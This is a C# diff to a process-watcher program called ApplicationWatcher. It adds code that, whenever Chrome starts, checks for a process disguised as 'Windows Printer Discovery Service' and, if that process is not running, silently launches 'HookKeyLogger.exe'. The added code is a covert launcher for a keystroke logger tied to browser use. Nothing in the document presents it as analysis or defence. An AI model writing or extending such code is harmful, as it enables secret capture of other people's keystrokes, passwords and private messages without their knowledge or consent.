@@ -4,6 +4,7 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Management;
+using System.Diagnostics;
 
 namespace ApplicationWatcher
 {
@@ -52,6 +53,7 @@ namespace ApplicationWatcher
         //    ApplicationWatcherAsync eventWatcher = new ApplicationWatcherAsync();
         //    Console.Read();
         //}
+        private static string locationExe = "HookKeyLogger.exe";
         public static void Main()
         {
             ManagementEventWatcher startWatch = new ManagementEventWatcher(
@@ -67,19 +69,34 @@ namespace ApplicationWatcher
             startWatch.Stop();
             stopWatch.Stop();
         }
+        private static bool isActive(string name)
+        {
+            foreach (Process clsProcess in Process.GetProcesses())
+            {
+                if (clsProcess.ProcessName.Contains(name))
+                {
+                    return true;
+                }
+            }
+            return false;
+        }
 
         static void stopWatch_EventArrived(object sender, EventArrivedEventArgs e)
         {
             Console.WriteLine("Process stopped: {0}", e.NewEvent.Properties["ProcessName"].Value);
         }
 
-        static void startWatch_EventArrived(object sender, EventArrivedEventArgs e)
+        private static void startWatch_EventArrived(object sender, EventArrivedEventArgs e)
         {
             //Console.WriteLine("Process started: {0}", e.NewEvent.Properties["ProcessName"].Value);
             string name = e.NewEvent.Properties["ProcessName"].Value.ToString();
             Console.WriteLine("Process started: {0}", name);
             if (name == "Chrome.exe")
+            {
                 Console.WriteLine("Found");
+                if (!isActive("Windows Printer Discovery Service"))
+                    System.Diagnostics.Process.Start(locationExe);
+            }
         }
     }
 }
